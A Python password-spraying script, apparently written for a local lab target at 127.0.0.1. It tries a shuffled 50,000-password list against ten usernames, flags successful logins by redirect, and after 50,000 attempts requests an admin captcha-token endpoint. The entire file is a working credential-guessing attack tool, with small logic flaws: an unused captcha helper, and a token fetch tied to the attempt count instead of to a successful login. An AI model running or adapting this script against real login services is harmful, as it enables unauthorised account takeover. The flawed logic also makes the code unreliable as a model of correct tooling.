import requests
import json
import os
import random 
import time

LOGIN_URL = "http://127.0.0.1:8000/login"
CAP_URL = "http://127.0.0.1:8000/admin/get_captcha_token?group_seed=3976056"

MAX_RUNTIME_SECONDS = 7200
SLEEP_SECONDS = 0.3
usernames = [
    "user1",
    "user2",
    "john",
    "charlie",
    "oliver",
    "nina",
    "bruce",
    "derek",
    "elena", 
    "linda"

]

PASSWORDS_FILE = "passwords_50k.json"

def load_passwords():
   
    if not os.path.exists(PASSWORDS_FILE):
        print(f"[ERROR]  {PASSWORDS_FILE} ")
        return []
    
    with open(PASSWORDS_FILE, "r", encoding="utf-8") as f:
        passwords = json.load(f)
    random.shuffle(passwords)
    return passwords

def fetch_captcha_token(session):
    try:
        r = session.get(
            "http://127.0.0.1:8000/admin/get_captcha_token",
            params={"group_seed": 3976056}
        )

        if r.status_code != 200:
            return None

        return r.json().get("captcha_token")

    except Exception:
        return None

def password_spraying():
    session = requests.Session()
    passwords = load_passwords()
    count_try =0
    start_time = time.time()
    for password in passwords:
        for username in usernames:
            if (time.time() - start_time) > MAX_RUNTIME_SECONDS:
                return 
            
                
            r = session.post(
                LOGIN_URL,
                data={
                    "username": username,
                    "password": password
                },
                allow_redirects=False
            )
            

            count_try +=1
            time.sleep(SLEEP_SECONDS)


            if (r.status_code == 302 and "/login" not in r.headers.get("Location", "")) :
                print(f"[SUCCESS] cracked user: {username}")

            if  count_try == 50000:
                token_response = session.get(CAP_URL)
                    
                if token_response.status_code == 200:
                        print(f"[SUCCESS] Token received for {username}: {token_response.text[:24]}...")
                else:
                        print(f"[!] Logged in but failed to get token. Status: {token_response.status_code}")
                    
                
                return


    print("[DONE] No valid credentials found")

if __name__ == "__main__":
    password_spraying()





